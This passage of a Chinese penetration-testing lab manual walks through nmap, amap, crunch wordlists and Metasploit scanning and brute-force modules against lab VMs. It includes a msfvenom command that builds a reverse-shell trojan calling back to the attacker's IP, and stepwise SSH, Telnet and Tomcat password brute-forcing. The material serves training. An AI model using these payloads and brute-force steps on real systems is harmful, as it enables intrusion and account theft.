class="line-numbers-rows"><span></span></span></code></pre></li><li><p>nmap扫描靶机特定端口 22 和 80 和 8080</p><pre class="line-numbers language-none"><code class="language-none">nmap -p 22,80,8080 192.168.163.136<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>nmap识别系统信息扫描</p><pre class="line-numbers language-none"><code class="language-none">nmap -O 192.168.163.136<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>nmap的批量扫描 - iL 从ip文本中导入扫描</p><pre class="line-numbers language-none"><code class="language-none">nmap -sS -iL ip.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><p><strong>实验总结</strong></p><p>区分NMAP不同参数的使用，牢记常用的参数</p><h1 id="实验-37-服务枚举-Amap"><a href="#实验-37-服务枚举-Amap" class="headerlink" title="实验 37 服务枚举-Amap"></a>实验 37 服务枚举-Amap</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用Amap工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>攻击机：kali<br>靶机：centos 6.9 ip地址：192.168.163.132</p><p><strong>实验工具</strong></p><p>zmap</p><p><strong>实验目的</strong></p><p>掌握amzp的使用</p><h2 id="实验步骤-23"><a href="#实验步骤-23" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol><li><p>启动amap查看帮助信息</p><pre class="line-numbers language-none"><code class="language-none">amap -b -q 192.168.163.132 22<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>还能设置端口的范围段</p><pre class="line-numbers language-none"><code class="language-none">amap -b -q 192.168.163.132 1-100<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><p><strong>实验总结</strong></p><p>思考Amzp是获取服务器的banner来获取服务器的信息，能想到有什么劣势吗。</p><h1 id="实验38-Metasploit-msfvenom生成payload实验"><a href="#实验38-Metasploit-msfvenom生成payload实验" class="headerlink" title="实验38 Metasploit-msfvenom生成payload实验"></a>实验38 Metasploit-msfvenom生成payload实验</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali上生成一个木马文件，当centos服务器上执行这个文件时，会反弹shell到kali上，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>kali 2016<br>centos 6.9</p><p><strong>实验工具</strong></p><p>Metasploit<br>ftp</p><p><strong>实验目的</strong></p><p>使用metasploit生成木马文件，在centos执行文件时拿到shell</p><h2 id="实验步骤-24"><a href="#实验步骤-24" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol><li><p>在kali虚拟机上测试与靶机的连通性</p><pre class="line-numbers language-none"><code class="language-none">ping 192.168.127.137 -c 4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>在靶机centos上测试与kali的连通性</p><pre class="line-numbers language-none"><code class="language-none">ping 192.168.127.138 -c 4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>在kali上使用shell马</p><pre class="line-numbers language-none"><code class="language-none">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.127.138 LPORT=4444 -f elf &gt; shell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>启动msfconsole</p></li><li><p>在kali中启动监听</p><pre class="line-numbers language-none"><code class="language-none">Run<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>通过ftp把生成的文件传到靶机上，在靶机上先给文件权限再运行文件</p></li><li><p>输入shell查看权限</p><pre class="line-numbers language-none"><code class="language-none">Shell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><p><strong>实验总结</strong></p><p>掌握使用kali下的metasploit生成木马文件，在centos执行文件时拿到shell</p><h1 id="实验-39-通用密码生成器-Crunch"><a href="#实验-39-通用密码生成器-Crunch" class="headerlink" title="实验 39 通用密码生成器-Crunch"></a>实验 39 通用密码生成器-Crunch</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用Crunch工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>攻击机：kali 2016</p><p><strong>实验工具</strong></p><p>crunch</p><p><strong>实验目的</strong></p><p>掌握kali下crunch工具的使用</p><h2 id="实验步骤-25"><a href="#实验步骤-25" class="headerlink" title="实验步骤"></a>实验步骤</h2><p>Crunch是一款密码生成工具，能按照要求生成一个密码文件，用于暴力破解。</p><ol><li><p>在终端直接输入 <code>crunch --h</code> 查看 Crunch 帮助信息。</p></li><li><p>生成的密码格式为：<code>crunch &lt;min&gt; &lt;max&gt; [options]</code>。这里我们使用不添加任何参数来生成密码：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">crunch 1 4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这会生成最少位数为 1 位，最大为 4 位的密码，由 26 个小写字母组成。</p></li><li><p>把字典保存成txt文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">crunch 1 4 -o passwd.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>制作以 189 开头的手机号密码字典：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">crunch 11 11 +0123456789 -t 188%%%%%%%% -o num.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>生成六位数小写字母密码，其中前四位为 “pass”：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">crunch 6 6 -t pass@@ -o passwd.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>生成六位密码，其中前四位为 “pass”，后两位为大写字母：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">crunch 6 6 -t pass,, -o passwd.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>生成六位密码，其中前四位为 “pass”，后两位为字符：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">crunch 6 6 -t pass^^ -o passwd.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>生成 4 位密码，其中格式为“两个数字” + “一个小写字母” + “常见符号”(其中数字这里被指定只能为 123 组成的所有 2 位数字组合)：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">crunch 4 4 + + 123 + -t %%@^<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><p><strong>实验总结</strong></p><p>掌握使用 Crunch 生成指定类型的密码文件。</p><h1 id="实验40-Metasploit-xmas实验"><a href="#实验40-Metasploit-xmas实验" class="headerlink" title="实验40 Metasploit-xmas实验"></a>实验40 Metasploit-xmas实验</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用 xmas 扫描模块，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>攻击机：kali 2016<br>靶机：centos 6.9</p><p><strong>实验工具</strong></p><p>Metasploit</p><p><strong>实验目的</strong></p><p>通过 xmas 模块来扫描靶机</p><h2 id="实验步骤-26"><a href="#实验步骤-26" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol><li><p>在kali虚拟机上测试与靶机的连通性：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ping 192.168.127.139 -c 4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>在靶机 centos 上测试与 kali 的连通性：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ping 192.168.127.140 -c 4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>在 kali 上启动 Metasploit：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfconsole<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>使用 xmas 模块：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use auxiliary/scanner/portscan/xmas<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>查看其它选项：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">show options<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>设置靶机地址：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">set rhosts 192.168.127.139<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>设置线程为 20：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">set threads 20<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>开始扫描：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">run<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><p><strong>实验总结</strong></p><p>掌握 Metasploit 下的 xmas 扫描靶机实验。</p><h1 id="实验41-Metasploit-tcp实验"><a href="#实验41-Metasploit-tcp实验" class="headerlink" title="实验41 Metasploit-tcp实验"></a>实验41 Metasploit-tcp实验</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用 TCP 方式去进行扫描，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>攻击机：kali 2016<br>靶机：centos 6.9</p><p><strong>实验工具</strong></p><p>Metasploit</p><p><strong>实验目的</strong></p><p>通过 TCP 模块来扫描靶机</p><h2 id="实验步骤-27"><a href="#实验步骤-27" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol><li><p>在kali虚拟机上测试与靶机的连通性：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ping 192.168.127.139 -c 4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>在靶机 centos 上测试与 kali 的连通性：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ping 192.168.127.140 -c 4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>在 kali 上启动 Metasploit：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfconsole<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>使用 TCP 模块：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use auxiliary/scanner/portscan/tcp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>查看其它选项：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">show options<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>设置靶机地址：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">set rhosts 192.168.127.139<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>设置线程为 20：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">set threads 20<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>开始扫描：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">run<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><p><strong>实验总结</strong></p><p>掌握 Metasploit 下的使用 TCP 扫描。</p><h1 id="实验42-Metasploit-syn实验"><a href="#实验42-Metasploit-syn实验" class="headerlink" title="实验42 Metasploit-syn实验"></a>实验42 Metasploit-syn实验</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用 SYN 方式去进行扫描，为避免在部署时候出现什么问题，小明</p><p>首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>攻击机：kali 2016<br>靶机：centos 6.9</p><p><strong>实验工具</strong></p><p>Metasploit</p><p><strong>实验目的</strong></p><p>通过 SYN 模块来扫描靶机</p><h2 id="实验步骤-28"><a href="#实验步骤-28" class="headerlink" title="实验步骤"></a>实验步骤</h2><p>通过 SYN 方式对防火墙上未被屏蔽的端口进行探测。</p><ol><li><p>在kali虚拟机上测试与靶机的连通性：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ping 192.168.127.139 -c 4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>在靶机 centos 上测试与 kali 的连通性：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ping 192.168.127.140 -c 4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>在 kali 上启动 Metasploit：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfconsole<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>使用 SYN 模块：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use auxiliary/scanner/portscan/syn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>查看其它选项：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">show options<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>设置靶机地址：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">set rhosts 192.168.127.139<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>设置线程为 20：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">set threads 20<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>开始扫描：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">run<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><p><strong>实验总结</strong></p><p>观察使用 SYN 扫描时，扫描的结果跟 TCP 和 UDP 扫描的方式有什么不同。</p><h1 id="实验43-Metasploit-ack实验"><a href="#实验43-Metasploit-ack实验" class="headerlink" title="实验43 Metasploit-ack实验"></a>实验43 Metasploit-ack实验</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用 ACK 方式去进行扫描，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>攻击机：kali 2016<br>靶机：centos 6.9</p><p><strong>实验工具</strong></p><p>Metasploit</p><p><strong>实验目的</strong></p><p>通过 ACK 模块来扫描靶机</p><h2 id="实验步骤-29"><a href="#实验步骤-29" class="headerlink" title="实验步骤"></a>实验步骤</h2><p>通过 ACK 方式对防火墙上未被屏蔽的端口进行探测。</p><ol><li><p>在kali虚拟机上测试与靶机的连通性：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ping 192.168.127.139 -c 4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>在靶机 centos 上测试与 kali 的连通性：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ping 192.168.127.140 -c 4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>在 kali 上启动 Metasploit：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfconsole<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>使用 ACK 模块：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use auxiliary/scanner/portscan/ack<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>查看其它选项：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">show options<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>设置靶机地址：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">set rhosts 192.168.127.139<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>设置线程为 20：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">set threads 20<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>开始扫描：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">run<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><p><strong>实验总结</strong></p><p>观察当使用 ACK 扫描时，扫描的结果跟 TCP 和 UDP 扫描的方式有什么不同。</p><h1 id="实验44-Metasploit-tomcat爆破实验"><a href="#实验44-Metasploit-tomcat爆破实验" class="headerlink" title="实验44 Metasploit-tomcat爆破实验"></a>实验44 Metasploit-tomcat爆破实验</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用 metasploit 去爆破 Tomcat 的登录密码，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>攻击机：kali 2016<br>靶机：centos 6.9</p><p><strong>实验工具</strong></p><p>Metasploit, Tomcat</p><p><strong>实验目的</strong></p><p>使用 Metasploit 下的 tomcat 爆破模块对 Tomcat 账户进行爆破</p><h2 id="实验步骤-30"><a href="#实验步骤-30" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol><li><p>在kali虚拟机上测试与靶机的连通性：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ping 192.168.127.137 -c 4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>在靶机 centos 上测试与 kali 的连通性：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ping 192.168.127.138 -c 4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>在 kali 上启动 Metasploit：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfconsole<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>搜索有效的 Tomcat 模块：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">search tomcat<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>这里选择使用模块 <code>auxiliary/scanner/http/tomcat_mgr_login</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use auxiliary/scanner/http/tomcat_mgr_login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>查看 tomcat_mgr_login 模块有效选项：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">show options<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>指定用户名和密码文件，这里使用默认路径：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">set user_file /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txtset pass_file /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>指定要攻击的目标服务器：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">set rhosts 192.168.127.137<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>设置服务器端口号为 8080：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">set rport 8080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>设置当渗透成功时停止：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">set stop_on_success true<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>运行攻击爆破成功密码：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">run<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><p><strong>实验总结</strong></p><p>掌握 Metasploit 下 tomcat 爆破方法的使用，对比 medusa 爆破速度上的区别。</p><h1 id="实验-45-路由信息探测-Traceroute"><a href="#实验-45-路由信息探测-Traceroute" class="headerlink" title="实验 45 路由信息探测-Traceroute"></a>实验 45 路由信息探测-Traceroute</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在 Kali 服务器使用 Traceroute 工具，为避免在部署时出现问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>攻击机：Kali 2016</p><p><strong>实验工具</strong></p><p>traceroute</p><p><strong>实验目的</strong></p><p>了解路由的概念和工作原理，掌握 Linux 下探测路由工具 Traceroute 的使用方法。</p><h2 id="实验步骤-31"><a href="#实验步骤-31" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol><li><p>路由是信息从源穿过网络传递到目的地的行为，在传播路径中至少经过一个中间节点。Traceroute 通过发送小的数据包到目的设备直到其返回，来测量其需要多长时间。一条路径上的每个设备 Traceroute 要测 3 次。输出结果中包括每次测试的时间（ms）和设备的名称（如有的话）及其 IP 地址。</p></li><li><p>打开 Linux 终端，输入 <code>traceroute</code>，查看使用语法。</p></li><li><p>查看本机 IP 地址：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ifconfig<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>使用 Traceroute 来追踪本机的路由：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">traceroute &lt;本机IP&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>把探测包的个数设置为值 8：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">traceroute -q 8 &lt;目标IP&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>探测包使用的基本 UDP 端口设置为 6888：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">traceroute -p 6888 &lt;目标IP&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>跳数设置：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">traceroute -m 15 &lt;目标IP&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>把对外发探测包的等待响应时间设置为 3 秒：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">traceroute -w 3 &lt;目标IP&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><p><strong>实验总结</strong></p><p>掌握使用 Traceroute 工具去探测路由信息。</p><h1 id="实验46-Metasploit之SNMP信息扫描"><a href="#实验46-Metasploit之SNMP信息扫描" class="headerlink" title="实验46 Metasploit之SNMP信息扫描"></a>实验46 Metasploit之SNMP信息扫描</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在 Kali 服务器使用 Metasploit 工具下的 SNMP 扫描，为避免在部署时出现问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>攻击机：Kali 2016<br>靶机：待补充</p><p><strong>实验工具</strong></p><p>Metasploit, SNMP</p><p><strong>实验目的</strong></p><p>在 Metasploit 中利用 SNMP 进行信息扫描。</p><h2 id="实验步骤-32"><a href="#实验步骤-32" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol><li><p>在 Kali 终端中启动 Metasploit：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfconsole<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>搜索当前系统内可用 SNMP 扫描模块：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">search snmp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>使用 SNMP 扫描模块：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use auxiliary/scanner/snmp/snmp_enum<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>查看该模块的有效选项：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">show options<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>设置扫描范围：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">set RHOSTS 192.168.1.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>设置扫描线程：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">set THREADS 10<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>使用 <code>run</code> 或 <code>exploit</code> 开始运行扫描：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">run<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><p><strong>实验总结</strong></p><p>在设置必选项目外其它的一些非必选项看看是什么意思。</p><h1 id="实验47-Metasploit之利用nmap扫描端口"><a href="#实验47-Metasploit之利用nmap扫描端口" class="headerlink" title="实验47 Metasploit之利用nmap扫描端口"></a>实验47 Metasploit之利用nmap扫描端口</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在 Kali 服务器使用 Metasploit 工具下的 nmap 扫描，为避免在部署时出现问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>攻击机：Kali 2016<br>靶机：待补充</p><p><strong>实验工具</strong></p><p>Metasploit</p><p><strong>实验目的</strong></p><p>在 Metasploit 中利用 nmap 扫描端口。</p><h2 id="实验步骤-33"><a href="#实验步骤-33" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol><li><p>在 Kali 终端中启动 Metasploit：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfconsole<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>检查 Metasploit 数据库是否启动（Kali 需要手动启动 PostgreSQL 数据库）：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">db_status<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>载入追踪者插件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">load db_tracker<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>启动 nmap 扫描并将结果存进数据库：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">db_nmap –sV –O –v –T 5 192.168.1.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>查看扫描过的主机，可以看到已经识别出的操作系统：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><p><strong>实验总结</strong></p><p>在 Metasploit 下的 nmap 扫描和在终端下的 nmap 扫描结果是否一样。</p><h1 id="实验48-Metasploit之SSH爆破模块"><a href="#实验48-Metasploit之SSH爆破模块" class="headerlink" title="实验48 Metasploit之SSH爆破模块"></a>实验48 Metasploit之SSH爆破模块</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在 Kali 服务器使用 Metasploit 工具下的 SSH 爆破，为避免在部署时出现问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>攻击机：Kali 2016<br>靶机：待补充</p><p><strong>实验工具</strong></p><p>Metasploit</p><p><strong>实验目的</strong></p><p>掌握 Metasploit 下 SSH 爆破模</p><p>块的使用。</p><h2 id="实验步骤-34"><a href="#实验步骤-34" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol><li><p>在 Kali 虚拟机上启动 msfconsole 控制台并测试与靶机的连通性：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ping 192.168.1.1 -c 4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>使用命令搜索 SSH 登录相关的模块：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">search ssh_login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>利用 SSH 爆破模块：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use auxiliary/scanner/ssh/ssh_login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>查看在该模块下需要设置的参数：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">show options<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>根据提示使用 <code>set</code> 语句填写必填参数，例如远程地址、爆破用户名字典、爆破密码字典。可选参数根据需要填写：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">set RHOSTS 192.168.1.1set USER_FILE /path/to/usernames.txtset PASS_FILE /path/to/passwords.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>发起攻击：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">run<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>成功爆破得到 SSH 用户名和密码，进行结果验证：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ssh &lt;target_address&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><p><strong>实验总结</strong></p><p>在 Metasploit 框架下的 SSH 爆破相比 Medusa 是否更具有优势。</p><h1 id="实验49-Metasploit-Telnet爆破"><a href="#实验49-Metasploit-Telnet爆破" class="headerlink" title="实验49 Metasploit-Telnet爆破"></a>实验49 Metasploit-Telnet爆破</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在 Kali 服务器使用 Metasploit 工具下的 Telnet 爆破，为避免在部署时出现问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>攻击机：Kali 2016<br>靶机：待补充</p><p><strong>实验工具</strong></p><p>Metasploit</p><p><strong>实验目的</strong></p><p>掌握 Metasploit 下 Telnet 爆破模块的使用。</p><h2 id="实验步骤-35"><a href="#实验步骤-35" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol><li><p>在 Kali 虚拟机上启动 msfconsole 控制台并测试与靶机的连通性：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ping 192.168.1.1 -c 4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>使用命令搜索 Telnet 登录相关的模块：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">search telnet_login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>利用 Telnet 爆破模块：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use auxiliary/scanner/telnet/telnet_login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>查看在该模块下需要设置的参数：</p><pre 